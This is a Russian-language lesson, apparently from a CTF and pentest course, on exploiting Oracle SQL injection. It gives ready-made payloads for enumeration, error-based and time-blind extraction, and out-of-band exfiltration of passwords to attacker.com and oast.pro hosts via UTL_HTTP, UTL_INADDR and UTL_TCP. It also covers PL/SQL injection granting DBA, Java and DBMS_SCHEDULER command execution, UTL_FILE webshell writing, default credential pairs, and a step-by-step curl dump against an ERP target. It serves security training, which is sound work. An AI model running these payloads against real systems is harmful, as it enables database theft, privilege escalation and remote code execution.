---
id: db-oracle
title: "Oracle: инъекции на практике — OOB через UTL_HTTP и DNS"
category: web
parent: web-sqli-dbms-enterprise
difficulty: hard
order: 2
tags: [sqli, oracle, plsql, utl_http, utl_inaddr, oob, all_tables, sqlmap]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Пентест корпоративных приложений"
  - "Bug bounty"
estimated_minutes: 50
summary: "Oracle от фингерпринта до OOB: all_tables, error-based через CTXSYS, time-blind через dbms_pipe, UTL_HTTP/DNS и PL/SQL-инъекции."
---

Oracle — самая «непохожая» на остальных СУБД: здесь нет `information_schema` в привычном виде, нет `LIMIT`, строки конкатенируются `||`, а комментарий `--` работает, но `#` — нет. Зато Oracle богат на функции для out-of-band: `UTL_HTTP` (HTTP-запросы), `UTL_INADDR` (DNS), `UTL_TCP` (сырые сокеты). Если прямой вывод закрыт, OOB через DNS часто остаётся единственным каналом. Инъекции в Oracle обычно эксплуатируют через error-based, time-blind и OOB.

## Фингерпринт и версия

Признаки Oracle: `ORA-00933: SQL command not properly ended`, `ORA-01756: quoted string not properly terminated`, `ORA-00942: table or view does not exist`, `ORA-00904: invalid identifier`. Важно: некавычечные идентификаторы Oracle приводит к ВЕРХНЕМУ регистру.

```sql
SELECT banner FROM v$version;                          -- Oracle Database 19c ...
SELECT version FROM v$instance;                        -- 19.0.0.0.0
SELECT * FROM v$version WHERE banner LIKE 'Oracle%';
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual;     -- ORCL
SELECT USER FROM dual;                                 -- APP
SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual;
SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM dual;
SELECT global_name FROM global_name;                   -- имя домена БД
```

В Oracle **каждый** `SELECT` требует `FROM dual` (виртуальная таблица), если не выбирается из реальной:

```bash
curl -s "https://target/item?id=-1 UNION SELECT 1,(SELECT banner FROM v$version WHERE rownum=1),3 FROM dual-- -"
```

## Схема и данные: all_tables, all_tab_columns

У Oracle нет `information_schema`; вместо него — словари `ALL_*`, `USER_*`, `DBA_*`:

```sql
-- таблицы текущего пользователя
SELECT table_name FROM user_tables;
-- таблицы, доступные пользователю
SELECT owner, table_name FROM all_tables;
-- колонки
SELECT column_name, data_type FROM all_tab_columns WHERE table_name='USERS';
-- схемы (пользователи)
SELECT username FROM all_users;
-- права
SELECT privilege FROM user_sys_privs;
SELECT granted_role FROM user_role_privs;
```

Агрегация строк — `LISTAGG` (11g R2+):

```sql
SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables;
SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_id) FROM user_tab_columns WHERE table_name='USERS';
-- без LISTAGG — через XMLAGG
SELECT RTRIM(XMLAGG(XMLELEMENT(e, table_name || ',')).EXTRACT('//text()'), ',') FROM user_tables;
```

Ограничение строк: `ROWNUM` (старый способ) или `FETCH FIRST n ROWS ONLY` (12c+):

```sql
SELECT table_name FROM all_tables WHERE rownum<=5;
SELECT table_name FROM all_tables FETCH FIRST 5 ROWS ONLY;
```

`LIMIT`/`OFFSET` в Oracle НЕ работают — это частая ошибка при переносе payload с MySQL.

## Error-based через CTXSYS и xmltype

Oracle печатает данные в ошибках несколькими путями.

**Через `CTXSYS.DRITHSX.SN`** (Oracle Text):

```sql
SELECT CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE rownum=1)) FROM dual;
-- ORA-20000: Oracle Text error: ... Oracle Database 19c ...
```

**Через `XMLType`** (аналог `extractvalue`):

```sql
SELECT XMLType('<x>' || (SELECT user FROM dual) || '</x>') FROM dual;
SELECT DBMS_XMLGEN.GETXML('SELECT user FROM dual') FROM dual;
```

**Через `UTL_INADDR.GET_HOST_NAME`** (превращает строку в DNS-имя → ошибка с содержимым):

```sql
SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) FROM dual;
-- ORA-292257: host APP unknown
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)) FROM dual;
```

Из-за лимита длины режем через `SUBSTR`:

```sql
SELECT CTXSYS.DRITHSX.SN(1, (SELECT SUBSTR(password,1,30) FROM users WHERE rownum=1)) FROM dual;
```

## Blind: boolean и time-based

**Boolean-blind** (сравнение по `SUBSTR`/`ASCII`):

```sql
1 AND 1=1
1 AND (SELECT SUBSTR(user,1,1) FROM dual)='A'
1 AND (SELECT COUNT(*) FROM user_tables)>3
1 AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>64
```

**Time-blind через `dbms_pipe.receive_message`** (ждёт сообщение N секунд):

```sql
1 AND 1=(SELECT 1 FROM dual WHERE 1=1) 
1; SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE 0 END FROM dual-- -
1 AND (SELECT CASE WHEN (SUBSTR(user,1,1)='A') THEN dbms_pipe.receive_message('a',5) ELSE 'x' END FROM dual)='x'
```

Другие источники задержки: тяжёлые запросы, `DBMS_LOCK.SLEEP(5)` (если доступна):

```sql
1 AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual)
-- тяжёлый запрос как «пауза»
1 AND (SELECT COUNT(*) FROM all_objects a, all_objects b, all_objects c)>0
```

## Out-of-band: UTL_HTTP и UTL_INADDR

Когда ответ не меняется и времени нет — уводим данные на свой сервер.

**DNS через `UTL_INADDR`** (нужны права; классика — Burp Collaborator / interactsh):

```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS('||(SELECT user FROM dual)||'.attacker.com') FROM dual;
SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)||'.attacker.com') FROM dual;
-- каждое успешное разрешение -> DNS-запрос к attacker.com с данными в поддомене
```

**HTTP через `UTL_HTTP`**:

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual;
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual;
-- через URL, чтобы данные пришли в HTTP-запрос
```

**Сырые сокеты `UTL_TCP`** (когда HTTP/DNS выключены):

```sql
SELECT UTL_TCP.OPEN_CONNECTION('attacker.com', 80) FROM dual;
```

Приём: запускаете `interactsh-client` (или `nc -lvvp 53`) и следите за DNS/HTTP-хитами. Каждый хит несёт фрагмент данных — выкачиваете посимвольно.

## PL/SQL-инъекция и Java stored procedures

Если вход попадает не в чистый SQL, а в PL/SQL-блок, возможна инъекция в анонимный блок:

```sql
-- приложение формирует: BEGIN app.proc('ВВОД'); END;
-- payload: '); EXECUTE IMMEDIATE 'GRANT DBA TO APP'; --
```

Java stored procedures — путь к RCE (если включён `dbms_java` и есть права):

```sql
-- создать Java-класс, компилирующийся в БД, и вызвать Runtime.exec
SELECT dbms_java.runjava('com.example.Exploit') FROM dual;
-- либо через loadjava загрузить класс, вызывающий Runtime.getRuntime().exec(...)
```

Проверка прав на Java/PL/SQL:

```sql
SELECT * FROM user_java_classes;
SELECT * FROM user_java_policy;
SELECT privilege FROM user_sys_privs WHERE privilege LIKE '%JAVA%';
```

## sqlmap и ручные команды

```bash
# базовая проверка (sqlmap сам определит Oracle)
sqlmap -u 'https://target/item?id=1' --batch --dbms=oracle --dbs

# из запроса
sqlmap -r request.txt -p id --batch --dbms=oracle --level=3 --risk=2

# дамп (учтите: --dump по схемам, не по базам)
sqlmap -r request.txt -p id --batch -D APP -T USERS -C USERNAME,PASSWORD --dump

# OOB через Collaborator
sqlmap -r request.txt -p id --batch --dbms=oracle --technique=U --dns-domain=abc.oast.pro

# список таблиц
sqlmap -r request.txt -p id --batch --dbms=oracle --tables
```

Обходы: `--tamper=space2comment,charencode,between,oraclequote`. Для Oracle часто помогает замена `'` на `CHR(39)` и конкатенация через `||`.

## Разобранный пример: OOB-дамп

Цель: `https://erp.local/report?id=100` (Java + Oracle).

```bash
# Шаг 1. Фингерпринт
curl -s "https://erp.local/report?id=100'" | grep -iE "ORA-"
# ORA-01756: quoted string not properly terminated

# Шаг 2. Число колонок
for n in 1 2 3 4; do echo -n "$n "; curl -s "https://erp.local/report?id=100 ORDER BY $n-- -" | wc -c; done
# 1 3000 / 2 3000 / 3 3000 / 4 12 -> 3

# Шаг 3. Версия (обязательно FROM dual)
curl -s "https://erp.local/report?id=-1 UNION SELECT 1,(SELECT banner FROM v$version WHERE rownum=1),3 FROM dual-- -"

# Шаг 4. Таблицы
curl -s "https://erp.local/report?id=-1 UNION SELECT 1,(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables),3 FROM dual-- -"

# Шаг 5. Колонки таблицы USERS
curl -s "https://erp.local/report?id=-1 UNION SELECT 1,(SELECT LISTAGG(column_name,',') FROM user_tab_columns WHERE table_name='USERS'),3 FROM dual-- -"

# Шаг 6. Если прямой вывод есть — дамп
curl -s "https://erp.local/report?id=-1 UNION SELECT 1,(SELECT LISTAGG(username||':'||password,',') FROM users),3 FROM dual-- -"

# Шаг 7. Иначе — error-based
curl -s "https://erp.local/report?id=-1 UNION SELECT 1,CTXSYS.DRITHSX.SN(1,(SELECT password FROM users WHERE rownum=1)),3 FROM dual-- -"

# Шаг 8. Или OOB (запустив interactsh-client)
curl -s "https://erp.local/report?id=-1 UNION SELECT 1,UTL_HTTP.REQUEST('http://abc.oast.pro/'||(SELECT password FROM users WHERE rownum=1)),3 FROM dual-- -"
```

## Частые ошибки

- **Забыть `FROM dual`.** Каждый `SELECT` в Oracle требует источник; без него — `ORA-00923`.
- **Использовать `LIMIT`/`OFFSET`.** В Oracle это `ROWNUM` или `FETCH FIRST ... ROWS ONLY`.
- **Путать регистр идентификаторов.** `all_tables` без кавычек = `ALL_TABLES` (верхний регистр); `"all_tables"` в кавычках — другой объект.
- **Искать `information_schema`.** В Oracle его нет; используйте `all_tables`, `all_tab_columns`, `user_*`.
- **Ждать stacked-запросов через `;`.** Одиночный `;` в SQL не выполняет второй запрос; для этого нужен PL/SQL-блок или инъекция в него.
- **Считать OOB всегда доступным.** `UTL_HTTP`/`UTL_INADDR` могут быть отозваны у пользователя (`REVOKE EXECUTE`).
- **Забывать про лимит длины ошибки.** Error-based режет данные — используйте `SUBSTR` и собирайте по частям.

## Полный справочник: команды, пейлоады, примитивы

Сводные таблицы: фингерпринт, клиентские команды, извлечение по техникам, файлы/Java/RCE и привилегии. Помните: конкатенация строк — двойная вертикальная черта, каждый `SELECT` требует источника (`FROM dual` для констант), а `LIMIT` отсутствует.

### (а) Фингерпринт и версия

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `SELECT banner FROM v$version` | полная версия | → `Oracle Database 19c Enterprise Edition ...` |
| `SELECT version FROM v$instance` | номер версии | → `19.0.0.0.0` |
| `SELECT * FROM v$instance` | инстанс, статус, старт | |
| `SELECT name FROM v$database` | имя БД | `ORCL` |
| `SYS_CONTEXT('USERENV','DB_NAME')` | имя БД через контекст | `SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual` |
| `USER` | текущий пользователь | `SELECT USER FROM dual` → `APP` |
| `SYS_CONTEXT('USERENV','CURRENT_USER')` | реальный пользователь | |
| `SYS_CONTEXT('USERENV','SESSION_USER')` | пользователь сессии | |
| `global_name` | домен БД | `SELECT global_name FROM global_name` |
| `SELECT * FROM v$diag_info` | пути к логам/трейсам | |
| `SELECT * FROM v$parameter WHERE name='utl_file_dir'` | каталоги UTL_FILE | |

Признак по ошибкам: `ORA-00933: SQL command not properly ended`, `ORA-01756: quoted string not properly terminated`, `ORA-00942: table or view does not exist`, `ORA-00904: invalid identifier`. Комментарий `--` работает, `#` — нет.

### (б) Клиентский CLI (sqlplus / sqlcl)

| Команда | Что делает | Пример |
|---------|-----------|--------|
| `sqlplus user/pass@host:1521/svc` | подключиться по EZCONNECT | `sqlplus app/secret@10.0.0.5:1521/ORCLPDB1` |
| `sqlplus -S -L user/pass@svc` | тихо + один логин | `sqlplus -S -L app/p@ORCL` |
| `sqlplus /nolog` | без авто-логина | затем `connect app/p@svc` |
| `sqlplus -s user/pass@svc @script.sql` | выполнить файл | `sqlplus -s app/p@ORCL @q.sql` |
| `set pagesize 0` | без пагинации | |
| `set heading off feedback off` | без заголовков/сообщений | `set heading off feedback off` |
| `set linesize 32000` | широкая строка | |
| `spool out.txt` | вывод в файл | `spool out.txt` … `spool off` |
| `SELECT ... FROM dual` | любой `SELECT` констант | `SELECT USER FROM dual` |
| `SELECT table_name FROM user_tables` | таблицы | |
| `DESC USERS` | структура | `DESCRIBE USERS` |
| `sqlcl` | современный CLI (Java) | `sqlcl app/p@host:1521/svc` |

### (в) Извлечение данных по техникам

| Техника | Пейлоад | Пример |
|---------|---------|--------|
| UNION (число колонок) | `ORDER BY n` | `?id=1 ORDER BY 4-- -` |
| UNION (вывод) | `-1 UNION SELECT 1,2,3 FROM dual` | `?id=-1 UNION SELECT 1,(SELECT banner FROM v$version WHERE rownum=1),3 FROM dual-- -` |
| UNION (схема) | `LISTAGG(table_name,',')` | `...SELECT 1,(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables),3 FROM dual-- -` |
| UNION (данные) | `LISTAGG(user\|\|':' \|\|pass,',')` | `...SELECT 1,(SELECT LISTAGG(username\|\|':' \|\|password,',') FROM users),3 FROM dual-- -` |
| Error-based | `CTXSYS.DRITHSX.SN(1,X)` | `SELECT CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) FROM dual` → `ORA-20000: ...` |
| Error-based | `UTL_INADDR.GET_HOST_NAME(X)` | `SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) FROM dual` → `ORA-292257: host APP unknown` |
| Error-based | `XMLType('<x>' \|\| X \|\| '</x>')` | `SELECT XMLType('<x>' \|\| (SELECT user FROM dual) \|\| '</x>') FROM dual` |
| Error-based | `DBMS_XMLGEN.GETXML` | `SELECT DBMS_XMLGEN.GETXML('SELECT user FROM dual') FROM dual` |
| Boolean-blind | `AND 1=1` / `AND 1=2` | `?id=1 AND 1=2-- -` |
| Boolean-blind | `SUBSTR`/`ASCII` | `?id=1 AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>64-- -` |
| Time-blind | `dbms_pipe.receive_message('a',5)` | `?id=1; SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE 0 END FROM dual-- -` |
| Time-blind | `DBMS_LOCK.SLEEP(5)` | `?id=1 AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual)-- -` |
| Time-blind (без функций) | тяжёлый join | `?id=1 AND (SELECT COUNT(*) FROM all_objects a, all_objects b, all_objects c)>0-- -` |
| OOB (DNS) | `UTL_INADDR.GET_HOST_ADDRESS(X)` | `SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)\|\|'.attacker.com') FROM dual` |
| OOB (HTTP) | `UTL_HTTP.REQUEST(X)` | `SELECT UTL_HTTP.REQUEST('http://attacker/' \|\| (SELECT password FROM users WHERE rownum=1)) FROM dual` |
| OOB (TCP) | `UTL_TCP.OPEN_CONNECTION` | `SELECT UTL_TCP.OPEN_CONNECTION('attacker.com',80) FROM dual` |
| Stacked/PL-SQL | инъекция в блок | `'); EXECUTE IMMEDIATE 'GRANT DBA TO APP'; --` |

### (г) Чтение/запись файлов и RCE

| Примитив | Что делает | Пример |
|----------|-----------|--------|
| `UTL_FILE.FOPEN(dir,name,'R')` | открывает файл на чтение (нужен `utl_file_dir`/`CREATE DIRECTORY`) | `SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('/tmp','a.txt','R'),1) FROM dual` |
| `UTL_FILE.FOPEN(dir,name,'W')` + `PUT_LINE` | пишет файл | `UTL_FILE.PUT_LINE(f,'<?php ...?>')` |
| `DBMS_LOB.GETLENGTH` / `SUBSTR` | чтение больших объектов | `SELECT DBMS_LOB.SUBSTR(lob,2000,1) FROM t` |
| `CREATE JAVA SOURCE` | компилирует Java в БД | `CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "E" AS public class E { ... Runtime.getRuntime().exec(...) ... }` |
| `dbms_java.runjava` | запускает Java-класс | `SELECT dbms_java.runjava('com.example.Exploit') FROM dual` |
| `loadjava` | загружает `.class`/`.jar` в БД | `loadjava -user app/p@ORCL Exploit.class` |
| `DBMS_SCHEDULER.CREATE_JOB` | внешняя задача (ОС-команда) при `EXTERNAL` | `DBMS_SCHEDULER.CREATE_JOB(job_name=>'j',job_type=>'EXECUTABLE',job_action=>'/bin/bash',...); DBMS_SCHEDULER.ENABLE('j');` |
| `DBMS_SCHEDULER` + `number_of_arguments` | передать аргументы команде | `job_action=>'/bin/sh'`, `number_of_arguments=>2` |
| `EXECUTE IMMEDIATE 'sql'` | динамический SQL (в PL/SQL-инъекции) | `EXECUTE IMMEDIATE 'GRANT DBA TO APP'` |
| `DBMS_XSLPROCESSOR` / `DBMS_XMLGEN` | обработка XML/файлов | |
| `CREATE DIRECTORY d AS '/path'` | создать объект-каталог | `CREATE DIRECTORY d AS '/tmp'; GRANT READ,WRITE ON DIRECTORY d TO APP;` |
| `DBMS_NETWORK_ACL_ADMIN` | выдать сетевые ACL для UTL_HTTP | `DBMS_NETWORK_ACL_ADMIN.APPEND_HOST_ACE(...)` |

### (д) Привилегии и эскалация

| Запрос | Что делает | Пример |
|--------|-----------|--------|
| `SELECT privilege FROM user_sys_privs` | системные права текущего | |
| `SELECT granted_role FROM user_role_privs` | роли текущего | `SELECT granted_role FROM user_role_privs` |
| `SELECT * FROM session_privs` | эффективные права сессии | |
| `SELECT * FROM dba_sys_privs` | системные права всех (нужны права) | |
| `SELECT * FROM dba_role_privs` | роли всех | |
| `SELECT * FROM dba_users WHERE account_status='OPEN'` | активные пользователи | |
| `SELECT username,password FROM dba_users` | хэши паролей (нужны права) | |
| `SELECT username FROM all_users` | все пользователи | `SELECT LISTAGG(username,',') FROM all_users` |
| `SELECT * FROM user_tab_privs` / `all_tab_privs` | привилегии на объекты | |
| `SELECT * FROM user_java_classes` | загруженные Java-классы | |
| `SELECT privilege FROM user_sys_privs WHERE privilege LIKE '%JAVA%'` | права на Java | |
| `GRANT DBA TO APP` | повышение до DBA | `GRANT DBA TO APP` |
| Дефолтные пары | вход по умолчанию | `scott/tiger`, `system/manager`, `sys/change_on_install`, `dbsnmp/dbsnmp` |

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Где в Oracle хранится список доступных таблиц?"
  options:
    - "information_schema.tables"
    - "all_tables"
    - "sys.objects"
    - "sqlite_master"
  answer: 1
  explanation: "Oracle использует словари all_tables/user_tables, а не information_schema."
- question: "Какая функция даёт паузу для time-based blind в Oracle?"
  options:
    - "SLEEP"
    - "pg_sleep"
    - "dbms_pipe.receive_message"
    - "WAITFOR DELAY"
  answer: 2
  explanation: "dbms_pipe.receive_message ждёт сообщение заданное число секунд."
- question: "Какая функция уводит данные по DNS (out-of-band) в Oracle?"
  options:
    - "UTL_INADDR.GET_HOST_ADDRESS"
    - "LOAD_FILE"
    - "xp_dirtree"
    - "pg_read_file"
  answer: 0
  explanation: "UTL_INADDR инициирует DNS-разрешение с данными в поддомене."
- question: "Что обязательно в каждом SELECT в Oracle?"
  options:
    - "LIMIT 1"
    - "FROM dual (если нет реальной таблицы)"
    - "ORDER BY"
    - "COMMIT"
  answer: 1
  explanation: "dual — виртуальная таблица-заглушка Oracle."
- question: "Как ограничить число строк в Oracle?"
  options:
    - "LIMIT 5"
    - "TOP 5"
    - "ROWNUM<=5 или FETCH FIRST 5 ROWS ONLY"
    - "OFFSET 5"
  answer: 2
  explanation: "LIMIT в Oracle отсутствует; используйте ROWNUM или FETCH FIRST."
```

## Где пригодится

- **CTF (Web):** Oracle-задачи требуют знания `all_tables`, `FROM dual` и OOB — это отличает их от MySQL.
- **Пентест корпоративных приложений:** Oracle — стандарт для ERP/CRM (SAP, 1C-интеграции, банки); OOB часто единственный канал.
- **Bug bounty:** реже, но встречается в крупных SaaS с Oracle-бэкендом; критичность максимальна.
- **Работа (AppSec):** понимание `UTL_HTTP`/`UTL_INADDR` и отзыва прав EXECUTE — основа hardening'а Oracle.
